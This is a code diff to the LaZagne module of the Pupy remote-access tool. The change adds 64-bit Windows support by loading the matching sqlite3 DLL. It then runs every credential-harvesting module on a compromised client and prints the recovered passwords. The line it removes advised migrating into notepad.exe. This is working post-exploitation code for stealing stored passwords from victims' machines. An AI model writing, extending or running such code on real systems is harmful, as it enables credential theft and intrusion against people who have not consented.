@@ -25,11 +25,12 @@ class LaZagne(PupyModule):
         platform=self.client.desc["platform"]
         if "Windows" in platform:
             if "64" in self.client.desc["proc_arch"]:
-                self.error('Not yet implemented for a x64 bits process, migrate to a 32 bits process and try again ! \nEx: run migrate -c \'C:\\Windows\\SysWOW64\\notepad.exe\'')
-                return
+                arch = "amd64"
+            else:
+                arch = "x86"
 
             # load all dependency
-            self.client.load_dll(os.path.abspath(os.path.join(os.path.dirname(__file__),"..", "packages", "windows", "x86", "sqlite3.dll")))
+            self.client.load_dll(os.path.abspath(os.path.join(os.path.dirname(__file__),"..", "packages", "windows", arch, "sqlite3.dll")))
             self.client.load_package("sqlite3")
             self.client.load_package("_sqlite3")
             self.client.load_package("xml")
@@ -47,14 +48,20 @@ class LaZagne(PupyModule):
             self.client.load_package("lazagne")
 
             db = Credentials()
-
+            
+            passwordsFound = False
             moduleNames = self.client.conn.modules["lazagne.config.manageModules"].get_modules()
             for module in moduleNames:
                 if args.verbose:
                     self.info("running module %s"%(str(module).split(' ',1)[0].strip('<')))
                 passwords = module.run(module.options['dest'].capitalize())
-                self.print_results(module.options['dest'].capitalize(), passwords, db)
+                if passwords:
+                	passwordsFound = True
+                	self.print_results(module.options['dest'].capitalize(), passwords, db)
             
+            if not passwordsFound:
+                self.warning("no passwords found !")
+        
         elif "Linux" in platform:
             isWindows = False
             if "64" in self.client.desc["os_arch"]:
